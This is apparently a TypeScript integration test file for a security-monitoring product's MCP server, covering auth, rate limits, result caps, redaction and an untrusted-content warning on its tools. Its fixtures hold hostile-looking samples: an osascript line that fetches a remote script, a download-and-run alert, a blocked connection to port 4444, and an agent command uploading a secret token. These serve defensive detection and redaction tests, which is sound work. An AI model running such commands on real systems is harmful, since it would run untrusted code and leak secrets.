// Integration tests for the SOC-facing MCP server: a real MCP client
// (StreamableHTTPClientTransport) against a real HTTP server answering from
// a fake store. The fake records what the tools asked for, so the caps and
// scoping are checked on both sides of the boundary.

import type { AddressInfo } from 'node:net';
import { createServer, type Server } from 'node:http';
import type { Transport } from '@modelcontextprotocol/sdk/shared/transport.js';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { ActionRecord, Alert, SensorEvent } from '@vigil/core';
import {
  MAX_RESULT_BYTES,
  MAX_ROWS,
  MAX_TEXT_CHARS,
  RATE_LIMIT_WINDOW_MS,
  TOOL_CALLS_PER_MINUTE,
  UNTRUSTED,
  bearerToken,
  fit,
  parseSince,
  relayMcpHandler,
  type RelayActionRow,
  type RelayAlertRow,
  type RelayDeviceFacts,
  type RelayEventRow,
  type RelayMcpOptions,
  type RelayMcpStore,
  type RelayRuleRow,
  type RelayStatusFacts,
} from './mcp.js';

// ---------------------------------------------------------------- fixtures

const NOW = Date.parse('2026-10-09T12:00:00Z');
const DAY = 24 * 60 * 60 * 1000;
const TOKEN = 'soc-token-aaaaaaaaaaaaaaaa';
const TOKEN_B = 'soc-token-bbbbbbbbbbbbbbbb';
const DEVICE = 'dev-0001-macbook-air';
const DEVICE_B = 'dev-0002-macbook-pro';

function execEvent(over: Partial<SensorEvent> = {}): SensorEvent {
  return {
    id: 'ev-0190-0001',
    ts: NOW - 60_000,
    source: 'santa',
    kind: 'process.exec',
    process: {
      pid: 8421,
      path: '/usr/bin/osascript',
      args: ['-e', 'do shell script "fetch https://x.example/s.sh"'],
      parentPath: '/bin/zsh',
      signing: 'unsigned',
      ancestors: ['zsh', 'iTerm2'],
    },
    ...over,
  } as SensorEvent;
}

function agentRequestEvent(): SensorEvent {
  return {
    id: 'ev-0190-0007',
    ts: NOW - 30_000,
    source: 'vigil',
    kind: 'agent.tool_request',
    tool: 'Bash',
    command: 'SECRET_TOKEN=9f86d081884c7d659a2feaa0c55ad015 upload --quiet',
    commandBytes: 60,
    cwd: '/Users/vlad/work',
    agent: { host: 'claude-code', id: 'claude-code' },
    process: { pid: 0, path: '/bin/zsh' },
  } as SensorEvent;
}

function alertFixture(over: Partial<Alert> = {}): Alert {
  return {
    id: 'al-0190-0001',
    createdAt: NOW - 45_000,
    updatedAt: NOW - 40_000,
    ruleId: 'core.exec-script',
    ruleVersion: 7,
    title: 'Unsigned interpreter fetched and ran code',
    summary: 'osascript downloaded a script with curl and ran it under zsh.',
    severity: 'high',
    fidelity: 'high',
    notify: 'popup',
    status: 'open',
    containment: 'active',
    eventIds: ['ev-0190-0001', 'ev-0190-0002'],
    actionIds: [],
    subject: { kind: 'process', label: '/usr/bin/osascript', path: '/usr/bin/osascript' },
    ai: {
      provider: 'openai-compatible',
      at: NOW - 39_000,
      verdict: 'likely_malicious',
      confidence: 0.91,
      summary: 'A staged download-and-run chain, unsigned, from a fresh domain.',
      details: 'The script fetched a second stage and executed it with sh.',
      proposalIds: [],
    },
    decision: { at: NOW - 20_000, verdict: 'malicious', remember: false },
    ...over,
  } as Alert;
}

const killAction: ActionRecord = {
  id: 'act-0190-0001',
  action: { kind: 'process.kill', pid: 8421, path: '/usr/bin/osascript' },
  actor: 'rule',
  reason: 'rule core.exec-script is in block mode',
  requestedAt: NOW - 44_000,
  status: 'done',
  alertId: 'al-0190-0001',
  ruleId: 'core.exec-script',
  result: { at: NOW - 43_999 },
};

const blockAction: ActionRecord = {
  id: 'act-0190-0002',
  action: { kind: 'network.block', address: '203.0.113.7', port: 4444 },
  actor: 'rule',
  reason: 'rule core.exec-script is in block mode',
  requestedAt: NOW - 43_000,
  status: 'done',
};

const restoreAction: ActionRecord = {
  id: 'act-0190-0003',
  action: { kind: 'file.restore', quarantineId: 'q-0190-0001' },
  actor: 'user',
  reason: 'the user said it was theirs',
  requestedAt: NOW - 10_000,
  status: 'done',
  undoes: 'act-0190-0001',
};

const ruleRow: RelayRuleRow = {
  device: DEVICE,
  id: 'core.exec-script',
  version: 7,
  name: 'Scripted downloader',
  description: 'Unsigned interpreters fetching and running code',
  mode: 'block',
  severity: 'high',
  exclusions: 3,
};

// ---------------------------------------------------------------- fake store

class FakeStore implements RelayMcpStore {
  nowTs = NOW;
  enrolled = new Set<string>([DEVICE, DEVICE_B]);
  deviceFacts: RelayDeviceFacts[] = [
    {
      id: DEVICE,
      state: 'active',
      lastSeenAt: NOW - 5_000,
      cursor: { ts: NOW - 5_000, id: 'ev-0190-0006' },
      backlog: 2,
      lagRecords: 3,
    },
    { id: DEVICE_B, state: 'quiet', backlog: 0, lagRecords: 900 },
  ];
  statusFacts: RelayStatusFacts = {
    devices: [
      { id: DEVICE, lastSeenAt: NOW - 5_000, backlog: 2, lagRecords: 3 },
      { id: DEVICE_B, backlog: 0, lagRecords: 900 },
    ],
  };
  eventRows: RelayEventRow[] = [];
  alertRows: RelayAlertRow[] = [];
  actionRows: RelayActionRow[] = [];
  ruleRows: RelayRuleRow[] = [ruleRow];

  /** What search_events last asked for, for cap assertions. */
  lastQuery: Parameters<RelayMcpStore['searchEvents']>[0] | undefined;

  now(): number {
    return this.nowTs;
  }
  status(): RelayStatusFacts {
    return this.statusFacts;
  }
  devices(): RelayDeviceFacts[] {
    return this.deviceFacts;
  }
  hasDevice(id: string): boolean {
    return this.enrolled.has(id);
  }
  searchEvents(q: Parameters<RelayMcpStore['searchEvents']>[0]): {
    events: RelayEventRow[];
    partial: boolean;
  } {
    this.lastQuery = q;
    let rows = this.eventRows.filter((r) => r.ts >= q.since);
    if (q.device !== undefined) rows = rows.filter((r) => r.device === q.device);
    if (q.kinds !== undefined) rows = rows.filter((r) => q.kinds!.includes(r.body.kind));
    if (q.text !== undefined) {
      const needle = q.text.toLowerCase();
      rows = rows.filter((r) => JSON.stringify(r.body).toLowerCase().includes(needle));
    }
    rows = rows.sort((a, b) => b.ts - a.ts || (a.id < b.id ? 1 : -1));
    if (q.before !== undefined) {
      const at = rows.findIndex((r) => r.id === q.before);
      if (at >= 0) rows = rows.slice(at + 1);
    }
    return { events: rows.slice(0, q.limit), partial: false };
  }
  alerts(q: {
    device?: string | undefined;
    since?: number | undefined;
    status?: 'open' | 'resolved' | undefined;
    limit: number;
  }): RelayAlertRow[] {
    let rows = this.alertRows;
    if (q.device !== undefined) rows = rows.filter((r) => r.device === q.device);
    if (q.since !== undefined) rows = rows.filter((r) => r.alert.createdAt >= q.since!);
    if (q.status !== undefined) rows = rows.filter((r) => r.alert.status === q.status);
    rows = rows.sort((a, b) => b.alert.createdAt - a.alert.createdAt);
    return rows.slice(0, q.limit);
  }
  alert(device: string, id: string): RelayAlertRow | undefined {
    return this.alertRows.find((r) => r.device === device && r.alert.id === id);
  }
  actions(q: {
    device?: string | undefined;
    since?: number | undefined;
    limit: number;
  }): RelayActionRow[] {
    let rows = this.actionRows;
    if (q.device !== undefined) rows = rows.filter((r) => r.device === q.device);
    if (q.since !== undefined) rows = rows.filter((r) => r.action.requestedAt >= q.since!);
    rows = rows.sort((a, b) => b.action.requestedAt - a.action.requestedAt);
    return rows.slice(0, q.limit);
  }
  rules(device: string): RelayRuleRow[] {
    return this.ruleRows.filter((r) => r.device === device);
  }
  rule(device: string, id: string): RelayRuleRow | undefined {
    return this.ruleRows.find((r) => r.device === device && r.id === id);
  }
}

// ---------------------------------------------------------------- harness

let store: FakeStore;
let httpServer: Server;
let url: string;

beforeEach(async () => {
  store = new FakeStore();
  ({ server: httpServer, url } = await startServer({
    store,
    verifySocToken: (t) => t === TOKEN || t === TOKEN_B,
  }));
});

afterEach(async () => {
  await new Promise<void>((done) => httpServer.close(() => done()));
});

async function startServer(o: RelayMcpOptions): Promise<{ server: Server; url: string }> {
  const handler = relayMcpHandler(o);
  const server = createServer((req, res) => {
    void handler(req, res).then((handled) => {
      if (!handled) {
        res.statusCode = 404;
        res.end();
      }
    });
  });
  await new Promise<void>((done) => server.listen(0, '127.0.0.1', () => done()));
  const port = (server.address() as AddressInfo).port;
  return { server, url: `http://127.0.0.1:${port}/mcp` };
}

/** A real MCP client over the SDK's own Streamable HTTP transport. */
async function connect(token: string | undefined): Promise<Client> {
  const client = new Client({ name: 'test-soc', version: '1.0.0' });
  const transport = new StreamableHTTPClientTransport(new URL(url), {
    ...(token ? { requestInit: { headers: { Authorization: `Bearer ${token}` } } } : {}),
  });
  // Same SDK typing wart as mcp.ts: class fields allow undefined where the
  // Transport interface allows only absence.
  await client.connect(transport as unknown as Transport);
  return client;
}

async function call(client: Client, name: string, args: Record<string, unknown> = {}) {
  return client.callTool({ name, arguments: args });
}

/** Parses a text tool result as JSON, failing loudly if the tool errored. */
function resultOf(r: Awaited<ReturnType<typeof call>>): Record<string, unknown> {
  expect(r.isError).toBeFalsy();
  const text = (r.content as { type: string; text: string }[])[0]?.text;
  expect(typeof text).toBe('string');
  return JSON.parse(text!) as Record<string, unknown>;
}

const rawPost = (init: { headers?: Record<string, string>; body?: string }): Promise<Response> =>
  fetch(url, {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      accept: 'application/json, text/event-stream',
      ...init.headers,
    },
    ...(init.body !== undefined ? { body: init.body } : {}),
  });

/** A minimal, valid initialize request, for raw probes of the HTTP layer. */
const initBody = (): string =>
  JSON.stringify({
    jsonrpc: '2.0',
    id: 1,
    method: 'initialize',
    params: {
      protocolVersion: '2025-03-26',
      capabilities: {},
      clientInfo: { name: 'probe', version: '1.0.0' },
    },
  });

// ---------------------------------------------------------------- tests

describe('auth', () => {
  it('challenges a request with no token and parses nothing', async () => {
    const res = await rawPost({ body: 'not even json' });
    expect(res.status).toBe(401);
    expect(res.headers.get('www-authenticate')).toContain('Bearer');
    expect(await res.text()).not.toContain('not even json');
  });

  it('challenges a wrong token, over raw HTTP and the SDK transport', async () => {
    const res = await rawPost({
      headers: { authorization: 'Bearer wrong-token' },
      body: initBody(),
    });
    expect(res.status).toBe(401);
    await expect(connect('wrong-token')).rejects.toThrow();
  });

  it('lets a valid SOC token through', async () => {
    const client = await connect(TOKEN);
    const r = await call(client, 'relay_status');
    expect(r.isError).toBeFalsy();
    await client.close();
  });
});

describe('rate limit', () => {
  async function restartWithLimit(n: number): Promise<void> {
    const fresh = await startServer({
      store,
      verifySocToken: (t) => t === TOKEN || t === TOKEN_B,
      toolCallsPerMinute: n,
    });
    httpServer = fresh.server;
    url = fresh.url;
  }

  it('answers 429 with Retry-After once one token exceeds its window', async () => {
    await restartWithLimit(2);
    const first = await rawPost({
      headers: { authorization: `Bearer ${TOKEN}` },
      body: initBody(),
    });
    expect(first.status).toBe(200);
    const second = await rawPost({
      headers: { authorization: `Bearer ${TOKEN}` },
      body: initBody(),
    });
    expect(second.status).toBe(200);
    const third = await rawPost({
      headers: { authorization: `Bearer ${TOKEN}` },
      body: initBody(),
    });
    expect(third.status).toBe(429);
    expect(Number(third.headers.get('retry-after'))).toBeGreaterThan(0);
  });

  it('budgets each token separately', async () => {
    await restartWithLimit(2);
    await rawPost({ headers: { authorization: `Bearer ${TOKEN}` }, body: initBody() });
    await rawPost({ headers: { authorization: `Bearer ${TOKEN}` }, body: initBody() });
    const other = await rawPost({
      headers: { authorization: `Bearer ${TOKEN_B}` },
      body: initBody(),
    });
    expect(other.status).toBe(200);
  });

  it('uses the house number by default', () => {
    expect(TOOL_CALLS_PER_MINUTE).toBe(120);
    expect(RATE_LIMIT_WINDOW_MS).toBe(60_000);
  });
});

describe('tools/list', () => {
  it('exposes the eight read-only tools with the untrusted-content suffix', async () => {
    const client = await connect(TOKEN);
    const list = await client.listTools();
    const names = list.tools.map((t) => t.name).sort();
    expect(names).toEqual([
      'get_alert',
      'get_rule',
      'list_actions',
      'list_alerts',
      'list_devices',
      'list_rules',
      'relay_status',
      'search_events',
    ]);
    for (const t of list.tools) {
      expect(t.description?.includes(UNTRUSTED), t.name).toBe(true);
      expect(t.description?.endsWith(UNTRUSTED), t.name).toBe(true);
      expect(t.annotations?.readOnlyHint, t.name).toBe(true);
    }
    await client.close();
  });

  it('sends the warning as server instructions too', async () => {
    const client = await connect(TOKEN);
    expect(client.getInstructions()).toContain(UNTRUSTED);
    await client.close();
  });
});

describe('relay_status and list_devices', () => {
  it('reports relay facts and device health', async () => {
    const client = await connect(TOKEN);
    const status = resultOf(await call(client, 'relay_status'));
    expect(status['relay']).toEqual({ name: 'vigil-relay', version: '0.1.0' });
    expect(status['devices']).toEqual([
      { id: DEVICE, lastSeenAt: new Date(NOW - 5_000).toISOString(), backlog: 2, lagRecords: 3 },
      { id: DEVICE_B, backlog: 0, lagRecords: 900 },
    ]);

    const devices = resultOf(await call(client, 'list_devices'));
    const first = (devices['devices'] as Record<string, unknown>[])[0]!;
    expect(first['id']).toBe(DEVICE);
    expect(first['state']).toBe('active');
    expect(first['cursor']).toEqual({
      at: new Date(NOW - 5_000).toISOString(),
      id: 'ev-0190-0006',
    });
    await client.close();
  });

  it('notes when no devices are enrolled', async () => {
    store.deviceFacts = [];
    const client = await connect(TOKEN);
    const devices = resultOf(await call(client, 'list_devices'));
    expect(devices['note']).toBeTruthy();
    await client.close();
  });
});

describe('search_events', () => {
  beforeEach(() => {
    store.eventRows = [
      ...Array.from({ length: 60 }, (_, i) => ({
        device: DEVICE,
        id: `ev-0190-${String(i).padStart(4, '0')}`,
        ts: NOW - 60_000 - i * 1_000,
        body: execEvent({ id: `ev-0190-${String(i).padStart(4, '0')}` }),
        outcome: {
          checked: 14,
          matches: [
            { ruleId: 'core.exec-script', ruleName: 'Scripted downloader', mode: 'block' as const },
          ],
        },
      })),
      {
        device: DEVICE_B,
        id: 'ev-0191-0001',
        ts: NOW - 90_000,
        body: execEvent({ id: 'ev-0191-0001', process: { pid: 1, path: '/usr/bin/curl' } }),
      },
    ];
  });

  it('defaults to 20 rows and never exceeds 50', async () => {
    const client = await connect(TOKEN);
    const out = resultOf(await call(client, 'search_events', {}));
    expect((out['events'] as unknown[]).length).toBe(20);
    expect(store.lastQuery?.limit).toBe(20);

    const capped = resultOf(await call(client, 'search_events', { limit: MAX_ROWS }));
    expect((capped['events'] as unknown[]).length).toBe(50);
    expect(store.lastQuery?.limit).toBe(50);

    // Over the cap the argument is refused before the store is asked.
    store.lastQuery = undefined;
    const over = await call(client, 'search_events', { limit: MAX_ROWS + 1 });
    expect(over.isError).toBe(true);
    expect(store.lastQuery).toBeUndefined();
    await client.close();
  });

  it('scopes to one device when asked', async () => {
    const client = await connect(TOKEN);
    const out = resultOf(await call(client, 'search_events', { device: DEVICE_B }));
    for (const ev of out['events'] as Record<string, unknown>[]) {
      expect(ev['device']).toBe(DEVICE_B);
    }
    expect(store.lastQuery?.device).toBe(DEVICE_B);
    await client.close();
  });

  it('filters by group and text', async () => {
    const client = await connect(TOKEN);
    const net = resultOf(await call(client, 'search_events', { group: 'network', limit: 50 }));
    expect((net['events'] as unknown[]).length).toBe(0); // fixtures have no network events
    expect(store.lastQuery?.kinds).toEqual(['network.connection', 'network.listen']);

    const curl = resultOf(await call(client, 'search_events', { text: 'curl', limit: 50 }));
    expect((curl['events'] as unknown[]).length).toBe(1);
    await client.close();
  });

  it('never looks back further than seven days', async () => {
    store.eventRows.push({
      device: DEVICE,
      id: 'ev-old-0001',
      ts: NOW - 8 * DAY,
      body: execEvent({ id: 'ev-old-0001' }),
    });
    const client = await connect(TOKEN);
    const out = resultOf(await call(client, 'search_events', { since: '30d', limit: 50 }));
    expect(store.lastQuery?.since).toBe(NOW - 7 * DAY);
    for (const ev of out['events'] as Record<string, unknown>[]) {
      expect(ev['id']).not.toBe('ev-old-0001');
    }
    await client.close();
  });

  it('rejects a text filter longer than the house bound', async () => {
    const client = await connect(TOKEN);
    const r = await call(client, 'search_events', { text: 'a'.repeat(MAX_TEXT_CHARS + 1) });
    expect(r.isError).toBe(true);
    await client.close();
  });

  it('keeps a large result within the 64 KB reply cap', async () => {
    // ~1 KB of command line per row after the house 1000-char clip: 50 rows
    // would brush the cap without the fitter watching.
    store.eventRows = store.eventRows.map((r) => ({
      ...r,
      body: execEvent({
        id: r.id,
        process: { pid: 1, path: '/usr/bin/tool', args: [`${'x'.repeat(2000)}-${r.id}`] },
      }),
    }));
    const client = await connect(TOKEN);
    const r = await call(client, 'search_events', { limit: MAX_ROWS });
    expect(r.isError).toBeFalsy();
    const text = (r.content as { type: string; text: string }[])[0]!.text;
    expect(text.length).toBeLessThan(MAX_RESULT_BYTES);
    const events = JSON.parse(text)['events'] as Record<string, unknown>[];
    for (const ev of events) {
      expect((ev['commandLine'] as string).length).toBeLessThanOrEqual(1000);
    }
    await client.close();
  });

  it('answers an enrolled-but-quiet device and an unknown device with notes, not errors', async () => {
    const client = await connect(TOKEN);
    store.enrolled.add('dev-0003-idle');
    const quiet = resultOf(await call(client, 'search_events', { device: 'dev-0003-idle' }));
    expect(quiet['events']).toEqual([]);
    expect(quiet['note']).toContain('enrolled');

    store.enrolled = new Set([DEVICE]);
    // An unknown device is, concretely, one with no data: clear its rows so
    // the fake matches what the real store would hold.
    store.eventRows = store.eventRows.filter((r) => r.device !== DEVICE_B);
    const unknown = resultOf(await call(client, 'search_events', { device: DEVICE_B }));
    expect(unknown['note']).toContain('No data has arrived');
    expect(unknown['note']).toContain('may be offline');
    await client.close();
  });

  it('ships no rule-match annotations on events — the wire carries the sensor body', async () => {
    store.eventRows = [
      {
        device: DEVICE,
        id: 'ev-0190-0007',
        ts: NOW - 30_000,
        body: agentRequestEvent(),
      },
    ];
    const client = await connect(TOKEN);
    const out = resultOf(await call(client, 'search_events', { text: 'claude' }));
    const ev = (out['events'] as Record<string, unknown>[])[0]!;
    expect(ev['kind']).toBe('agent.tool_request');
    expect(ev['rules']).toBeUndefined();
    await client.close();
  });

  it('redacts at serve time, not only at ship time', async () => {
    store.eventRows = [
      {
        device: DEVICE,
        id: 'ev-0190-0007',
        ts: NOW - 30_000,
        body: agentRequestEvent(),
      },
    ];
    const client = await connect(TOKEN);
    const out = resultOf(await call(client, 'search_events', {}));
    const ev = (out['events'] as Record<string, unknown>[])[0]!;
    // The redactor withholds the whole field when a secret pattern is
    // imprecise — stronger than an inline replacement.
    expect(ev['command']).toContain('withheld');
    expect(ev['command']).not.toContain('SECRET_TOKEN');
    await client.close();
  });
});

describe('alerts and actions', () => {
  beforeEach(() => {
    store.alertRows = [
      { device: DEVICE, alert: alertFixture() },
      { device: DEVICE_B, alert: alertFixture({ id: 'al-0191-0002', status: 'open' }) },
      {
        device: DEVICE_B,
        alert: alertFixture({ id: 'al-0191-0001', status: 'resolved', containment: 'none' }),
      },
    ];
    store.actionRows = [
      { device: DEVICE, action: killAction },
      { device: DEVICE, action: blockAction },
      { device: DEVICE_B, action: restoreAction },
    ];
  });

  it('lists alerts scoped by device with AI and user verdicts as stored', async () => {
    const client = await connect(TOKEN);
    const out = resultOf(await call(client, 'list_alerts', { device: DEVICE }));
    const rows = out['alerts'] as Record<string, unknown>[];
    expect(rows.length).toBe(1);
    const a = rows[0]!;
    expect(a['device']).toBe(DEVICE);
    expect(a['id']).toBe('al-0190-0001');
    expect(a['rule']).toBe('Scripted downloader');
    expect(a['severity']).toBe('high');
    expect(a['status']).toBe('open');
    expect(a['containment']).toBe('active');
    expect(a['aiVerdict']).toBe('likely_malicious');
    expect(a['userVerdict']).toBe('malicious');
    expect(a['events']).toBe(2);
    await client.close();
  });

  it('filters alerts by status and pages with more', async () => {
    const client = await connect(TOKEN);
    const open = resultOf(await call(client, 'list_alerts', { status: 'open', limit: 1 }));
    expect((open['alerts'] as unknown[]).length).toBe(1);
    expect(open['more']).toBe(true);
    const resolved = resultOf(await call(client, 'list_alerts', { status: 'resolved', limit: 50 }));
    expect((resolved['alerts'] as unknown[]).length).toBe(1);
    expect(resolved['more']).toBe(false);
    await client.close();
  });

  it('returns one alert in full, or an in-band error for a wrong id', async () => {
    const client = await connect(TOKEN);
    const out = resultOf(await call(client, 'get_alert', { device: DEVICE, id: 'al-0190-0001' }));
    const a = out['alert'] as Record<string, unknown>;
    expect(a['explanation']).toContain('staged download');
    expect(a['explanationDetails']).toContain('second stage');

    const miss = await call(client, 'get_alert', { device: DEVICE, id: 'nope' });
    expect(miss.isError).toBe(true);
    expect((miss.content as { text: string }[])[0]?.text).toContain('list_alerts');
    await client.close();
  });

  it('describes actions as what was done, to what, and flags releases', async () => {
    const client = await connect(TOKEN);
    const out = resultOf(await call(client, 'list_actions', { device: DEVICE }));
    const rows = out['actions'] as Record<string, unknown>[];
    expect(rows.length).toBe(2);
    expect(rows[0]!['did']).toBe('blocked a connection');
    expect(rows[0]!['target']).toBe('203.0.113.7 port 4444');
    expect(rows[1]!['did']).toBe('stopped a process');
    expect(rows[1]!['target']).toBe('/usr/bin/osascript');

    const all = resultOf(await call(client, 'list_actions', { device: DEVICE_B }));
    const restore = (all['actions'] as Record<string, unknown>[])[0]!;
    expect(restore['release']).toBe(true);
    expect(restore['undoes']).toBe('act-0190-0001');
    await client.close();
  });

  it('never shows rule conditions or exclusions — only their count', async () => {
    const client = await connect(TOKEN);
    const list = resultOf(await call(client, 'list_rules', { device: DEVICE }));
    const listJson = JSON.stringify(list);
    expect(listJson).not.toContain('exclusions');
    expect(listJson).not.toContain('condition');
    const rules = list['rules'] as Record<string, unknown>[];
    expect(rules[0]!['name']).toBe('Scripted downloader');
    expect(rules[0]!['mode']).toBe('block');

    const one = resultOf(
      await call(client, 'get_rule', { device: DEVICE, id: 'core.exec-script' }),
    );
    const rule = one['rule'] as Record<string, unknown>;
    expect(rule['exclusionCount']).toBe(3);
    expect(JSON.stringify(one)).not.toContain('/Users/');
    await client.close();
  });

  it('answers an unknown rule id in band', async () => {
    const client = await connect(TOKEN);
    const r = await call(client, 'get_rule', { device: DEVICE, id: 'nope' });
    expect(r.isError).toBe(true);
    await client.close();
  });
});

describe('http surface', () => {
  it('answers GET and DELETE with 405 after auth', async () => {
    const get = await fetch(url, { headers: { authorization: `Bearer ${TOKEN}` } });
    expect(get.status).toBe(405);
    expect(get.headers.get('allow')).toBe('POST');
    const del = await fetch(url, {
      method: 'DELETE',
      headers: { authorization: `Bearer ${TOKEN}` },
    });
    expect(del.status).toBe(405);
  });

  it('answers malformed JSON with 400 and an oversized body with 413', async () => {
    const bad = await rawPost({ headers: { authorization: `Bearer ${TOKEN}` }, body: '{oops' });
    expect(bad.status).toBe(400);
    const big = await rawPost({
      headers: { authorization: `Bearer ${TOKEN}` },
      body: 'x'.repeat(1024 * 1024 + 1),
    });
    expect(big.status).toBe(413);
  });

  it('hands paths other than /mcp back to the listener', async () => {
    const handler = relayMcpHandler({ store, verifySocToken: () => true });
    const handled = await handler(
      { url: '/healthz', method: 'GET', headers: {} } as never,
      { statusCode: 0, setHeader: () => undefined, end: () => undefined } as never,
    );
    expect(handled).toBe(false);
  });

  it('reads the bearer token out of the Authorization header', () => {
    expect(bearerToken('Bearer abc')).toBe('abc');
    expect(bearerToken('bearer abc')).toBe('abc');
    expect(bearerToken('Bearer ')).toBeUndefined();
    expect(bearerToken('Basic abc')).toBeUndefined();
    expect(bearerToken(undefined)).toBeUndefined();
  });
});

describe('fit', () => {
  it('drops rows until the result fits and marks the cut', () => {
    const big = { events: Array.from({ length: 100 }, (_, i) => ({ i, note: 'y'.repeat(2000) })) };
    const out = fit(big, (v) => v);
    expect(Buffer.byteLength(JSON.stringify(out))).toBeLessThanOrEqual(MAX_RESULT_BYTES);
    expect(out['truncated']).toBe(true);
    expect((out['events'] as unknown[]).length).toBeLessThan(100);
  });

  it('leaves a small result untouched', () => {
    const out = fit({ events: [{ id: 1 }] }, (v) => v);
    expect(out['truncated']).toBeUndefined();
  });
});

describe('parseSince', () => {
  it('takes spans back from now and absolute ISO times', () => {
    expect(parseSince('30m', NOW)).toBe(NOW - 30 * 60_000);
    expect(parseSince('24h', NOW)).toBe(NOW - 24 * 3_600_000);
    expect(parseSince('7d', NOW)).toBe(NOW - 7 * DAY);
    expect(parseSince('2026-10-01T09:00:00Z', NOW)).toBe(Date.parse('2026-10-01T09:00:00Z'));
    expect(() => parseSince('yesterday', NOW)).toThrow();
  });
});
